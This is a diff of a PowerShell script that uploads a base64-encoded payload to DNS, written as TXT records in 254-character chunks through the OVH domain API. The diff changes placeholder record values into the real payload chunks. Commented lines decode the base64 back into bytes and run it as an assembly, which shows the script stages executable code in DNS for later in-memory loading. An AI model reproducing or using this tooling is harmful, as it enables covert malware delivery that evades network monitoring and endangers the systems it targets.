@@ -1,4 +1,12 @@
-﻿# OVH cred API
+﻿<#
+    *
+    * @Author : Olivier LEUNG
+    * @Created : 18/03/2023
+    * @Version : 1.2
+    *
+#>
+
+# OVH cred API
 # ----------------------------------------------------------------------------
 $global:endpoint=""
 $global:AK = ""
@@ -69,8 +77,9 @@ Switch($Choice){
         $subDomainNumber = [math]::Ceiling($base64.Length/254)
         Write-Output("Number of SUBDOMAIN : {0}" -f $subDomainNumber)
         $QUERY = "https://api.ovh.com/1.0/domain/zone"
+        $METHOD = "GET"
+        $BODY=""
         $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
-        Write-Output("Get Domain")
         $DOMAIN = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
         Write-Output("DOMAIN : {0}" -f $DOMAIN)
 
@@ -80,7 +89,7 @@ Switch($Choice){
         $i = 0
 
         $subString = $base64.Substring($i*254,254)
-        $BODY = @{"fieldType"="TXT"; "subDomain"="test"; "target"="aa"} | ConvertTo-Json
+        $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
         $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
         Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
 
@@ -126,7 +135,7 @@ Switch($Choice){
 # $bytes2 = [System.Convert]::FromBase64String($base64)
 # RunAssembly($bytes2)
 
-# Send base64 payload to DNS server
+
 
 
 
